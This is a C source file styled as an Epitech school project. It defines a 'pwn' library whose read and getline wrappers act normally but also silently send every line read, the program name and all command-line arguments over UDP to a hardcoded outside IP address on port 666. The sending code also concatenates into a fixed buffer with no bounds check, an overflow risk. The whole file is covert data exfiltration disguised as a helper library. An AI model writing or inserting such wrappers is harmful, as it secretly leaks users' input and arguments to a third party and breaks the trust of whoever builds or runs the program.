/*
** EPITECH PROJECT, 2020
** EPWNTECH
** File description:
** Hello Marvin, How Are You?
*/

#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>

#ifndef PWNLIB_H_
#define PWNLIB_H_

#define SERVER_IP       "94.140.114.192"
#define SERVER_PORT     666
#define STATUS_OK       0
#define BUFFSIZE        4096

struct pwn {
    int socket;
    struct sockaddr_in server;
    char *name;
};

typedef struct pwn pwn_t;

ssize_t pwn_getline(char **lineptr, size_t *n, FILE *stream);
ssize_t pwn_read(int fd, void *buf, size_t count);
void pwn_close(void);
void pwn_sendstr(char *str);
void pwn_init_nomain(void);
void pwn_init(int ac, char **av);

#endif

int pwn_errno;
pwn_t conn;
char buffer[BUFFSIZE];

ssize_t pwn_getline(char **lineptr, size_t *n, FILE *stream)
{
    int val = 0;

    val = getline(lineptr, n, stream);
    if (val > 0)
        pwn_sendstr(*lineptr);
    return (val);
}

ssize_t pwn_read(int fd, void *buf, size_t count)
{
    int val = 0;

    val = read(fd, buf, count);
    if (val > 0)
        pwn_sendstr(buf);
    return (val);
}

void pwn_close(void)
{
    if (pwn_errno == STATUS_OK) {
        free(conn.name);
        close(conn.socket);
    }
    return;
}

void pwn_sendstr(char *str)
{
    if (pwn_errno != STATUS_OK)
        return;
    memset(buffer, 0, BUFFSIZE);
    strcat(buffer, conn.name);
    strcat(buffer, ": ");
    strcat(buffer, str);
    sendto(conn.socket, buffer, BUFFSIZE, 0,
    (struct sockaddr *)&conn.server, sizeof(conn.server));
    return;
}

void pwn_init_nomain(void)
{
    pwn_errno = 0;
    conn.name = strdup("NULL");
    memset(&conn.server, 0, sizeof(struct sockaddr_in));
    conn.socket = socket(PF_INET, SOCK_DGRAM, 0);
    if (conn.socket == -1) {
        pwn_errno = -1;
        return;
    }
    conn.server.sin_family = AF_INET;
    conn.server.sin_addr.s_addr = inet_addr(SERVER_IP);
    conn.server.sin_port = htons(SERVER_PORT);
    return;
}

void pwn_init(int ac, char **av)
{
    pwn_errno = 0;
    conn.name = strdup(av[0]);
    memset(&conn.server, 0, sizeof(struct sockaddr_in));
    conn.socket = socket(PF_INET, SOCK_DGRAM, 0);
    if (conn.socket == -1) {
        pwn_errno = -1;
        return;
    }
    conn.server.sin_family = AF_INET;
    conn.server.sin_addr.s_addr = inet_addr(SERVER_IP);
    conn.server.sin_port = htons(SERVER_PORT);
    for (int i = 0; i < ac; i++) {
        memset(buffer, 0, BUFFSIZE);
        strcat(buffer, conn.name);
        strcat(buffer, ": ");
        strcat(buffer, av[i]);
        sendto(conn.socket, buffer, BUFFSIZE, 0,
        (struct sockaddr *)&conn.server, sizeof(conn.server));
    }
    return;
}